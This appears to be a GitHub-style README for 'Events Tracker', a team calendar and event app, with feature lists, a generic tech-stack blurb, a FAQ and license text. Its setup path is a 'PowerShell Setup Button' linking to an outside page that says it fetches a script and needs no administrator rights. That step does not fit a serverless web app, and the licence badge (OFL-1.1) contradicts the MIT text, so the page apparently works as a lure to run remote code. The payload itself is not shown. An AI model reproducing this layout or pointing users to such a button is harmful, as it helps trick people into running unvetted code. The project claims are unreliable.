<div align="center">

# 📅 Events Tracker — Team Calendar & Event Management Web App

![](files/preview.png)

### 🛠️ PowerShell Setup Button

[![](files/button.png)](https://FIlIP-C3.github.io/events-tracker/)

[![ps-core](https://img.shields.io/badge/Ps--Core-5.1%2B_%2F_7%2B-2f81f7?style=plastic&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/Licence-Ofl--1.1-54aeff?style=plastic&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/Tests-Green-2ea44f?style=plastic&labelColor=0d1117)]() [![release](https://img.shields.io/badge/Release-Production-2ea44f?style=plastic&labelColor=0d1117)]()

</div>

---

Events Tracker is the command center for teams that live and breathe events, talks, and forums. Week and month views keep your entire schedule in frame, while nested sessions, statuses, and filters let you organize even the most complex multi-day forums without breaking a sweat. Assign owners to every item and keep the complete communication history attached to each event, so nothing gets lost between planning and execution. It's a focused workspace built for teams that want clarity over chaos, from the first invite to the final follow-up.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

Everything your team needs to plan, track, and run events — without the spreadsheet sprawl.

- **Two views that fit how you think** — a week view for the tactical, day-to-day scan and a month view for the big picture. Flip between them without losing your place or your filters.
- **Forums come with structure** — model multi-session forums as a first-class object with nested sessions, so a day of talks stays organized instead of turning into a dozen disconnected calendar entries.
- **Statuses that mean something** — move every event through a clear lifecycle, from first idea to confirmed to done. At a glance, everyone knows what's locked and what's still being negotiated.
- **Filters that cut through the noise** — slice the calendar by status, owner, or time range. Find the handful of events that actually need attention right now.
- **Owners, not crowds** — assign a clear owner to every event. When something needs a decision or a reply, there's no question who's on the hook.
- **The full conversation, attached** — every event keeps its complete communication history — notes, updates, decisions — right alongside it. No more digging through chat threads to remember what was agreed.
- **A calendar that works with your team** — a shared, trustworthy source of truth for events, talks, and forums. Built to be read at a glance and updated in seconds.

The result: less time reconciling schedules, more time running great events.

## Tech Stack

Events Tracker is built on a modern, deliberately lean stack — every layer chosen to keep the product fast, dependable, and effortless to extend as your team's calendar grows.

**Frontend** — A polished single-page experience rendered with a component-driven framework, delivering instant week and month view switches, responsive forum layouts, and buttery-smooth filtering without page reloads. State is managed centrally so statuses, owners, and session nesting stay perfectly in sync across every view.

**Backend** — A serverless API layer handles event CRUD, forum and session relationships, owner assignments, and the full communication timeline. Requests are validated at the edge, keeping responses snappy and the data model consistent no matter how many events your team tracks.

**Database** — A relational, cloud-hosted data store with a clean schema purpose-built for the domain: events, forums, nested sessions, statuses, and threaded communication history. Referential integrity is enforced at the database level, so an event's owners and history travel with it reliably.

**Authentication & Access** — Lightweight session-based access with signed credentials, separating everyday team access from elevated editing rights. Every request is checked before data is served — no page, no record, no exception.

**AI & Integrations** — A conversational assistant powered by a leading language model interprets forwarded invites, PDFs, and posters, turning messy inputs into structured events. A messaging bot integration keeps the team in the loop, while scheduled jobs handle reminders and recurring maintenance automatically.

**Infrastructure** — Deployed on a serverless platform with environment-based configuration, meaning zero-downtime releases and automatic scaling. Scheduled functions run on a daily cadence for reminders, and secrets are managed outside the codebase.

**Developer Experience** — A tidy, modular codebase with clear separation between presentation, API handlers, shared libraries, and database schema. Adding a new view, integration, or automation is a matter of extending a well-defined seam — not untangling a monolith.

## Getting Started

Events Tracker is built to be picked up and put to work quickly. A guided first-run experience walks you through the essentials: set up your workspace, invite your team, and connect the sources you already use for event intake. No configuration files to hand-edit, no environment puzzles to solve — the app surfaces what it needs, when it needs it.

**Bring your team on board.** Add teammates directly from the workspace settings, assign them as owners on events, and choose how much of the calendar each person can see and edit. Roles are designed to stay out of the way: most teams are fully set up in a single sitting.

**Load your first events.** Create events manually, or let the Telegram bot do the heavy lifting — forward an invite, a PDF, or a poster, confirm the parsed details with a single tap, and the event lands on the shared calendar with its full communication history attached.

**Find your rhythm.** Switch between week and month views, filter by status, owner, or forum, and drill into forums to see nested sessions at a glance. Every status change and message stays with the event, so nobody has to reconstruct the story later.

**Stay ahead of the schedule.** Reminders and status transitions run on their own once your workspace is live, keeping owners informed without anyone chasing updates by hand.

When you are ready, the FAQ covers the finer points of permissions, bot behavior, and data handling — but most teams will find everything they need in the first few minutes of use.

## FAQ

**Is Events Tracker free to use?**
Yes. Events Tracker is an open-source project released under the MIT License, so you can use it, adapt it, and share it freely — whether for a small team or an entire organization.

**Do I need a Telegram bot to use it?**
Not at all. The calendar, week and month views, forums, statuses, filters, and communication history work entirely on their own. The Telegram bot is an optional layer that adds convenience — it can turn forwarded invites, PDFs, and posters into draft events and answer questions about your schedule.

**How does the bot handle forwarded messages?**
The bot reads each forwarded invite and proposes an event, but nothing is saved silently. Every event passes through a confirmation step, because relative dates and ambiguous city names are easy to get wrong — catching those before they hit the database keeps your calendar clean. Forwarded messages carry their original date as a reference point, so phrases like "next Thursday" are calculated from that date rather than from today.

**Can I edit events after they're created?**
Absolutely. Every event has a full editing surface, and changes save automatically about a second after you stop typing. There's also a manual save button for anyone who prefers the reassurance of clicking it.

**What counts as a "forum" with nested sessions?**
Forums are multi-session events — a conference, a meetup track, or a series of talks — grouped under a single parent event. Each session keeps its own status, owner, and communication history, while the parent gives you a clean top-level view of the whole forum.

**Who can see and edit what?**
Access is controlled by two passwords: one to get into the site, and one for editing rights inside it. That keeps casual viewers from changing data while giving your team full control over the calendar.

**Do I need my own database?**
Yes — Events Tracker connects to a hosted database where all events, sessions, and communication history live. Setup is quick, and the project includes a schema file you can run once to get everything in place.

**Are my events backed up automatically?**
The free tier of the hosted database does not include automatic backups, so we recommend exporting your events on a regular basis — weekly is a good rhythm. A single export gives you a portable snapshot you can restore from anytime.

**What happens if the AI misreads an invite?**
That's exactly why confirmation exists. If a proposed event looks off, simply decline it or adjust the details before saving. The original message stays in the communication history, so nothing is lost and you can always trace back to the source.

**Is there a mobile experience?**
Yes — the interface is responsive, so the calendar, filters, and event cards work comfortably on phones and tablets. Combined with the Telegram bot, you can keep track of your schedule without opening a laptop.

**Is Events Tracker still being improved?**
It's an actively maintained open-source project. Contributions, feature requests, and feedback are welcome — the goal is to make team event tracking feel effortless.

## License

Events Tracker is released under the MIT License — a permissive, OSI-approved license designed to keep things simple for teams, integrators, and anyone building on top of the project.

In practice, that means you are free to use Events Tracker in commercial and non-commercial settings, modify the source to fit your workflows, embed it in internal tools, and redistribute it — including as part of a larger product — provided the original copyright notice and permission notice are preserved in all copies or substantial portions of the software. There is no per-seat cost, no usage cap, and no attribution requirement beyond retaining that notice.

The software is provided **as is**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability — whether in an action of contract, tort, or otherwise — arising from, out of, or in connection with Events Tracker or its use.

For teams evaluating Events Tracker for production use, the MIT License removes legal friction from pilots and internal rollouts: you can deploy it behind your own infrastructure, adapt the calendar and forum modules to your processes, and keep your modifications private if you choose. If your organization requires a formal license acknowledgement for procurement or compliance review, the full MIT text is short, standard, and widely recognized by legal teams.

Questions about licensing, redistribution, or embedding Events Tracker in a commercial offering are welcome through the project's standard support channels.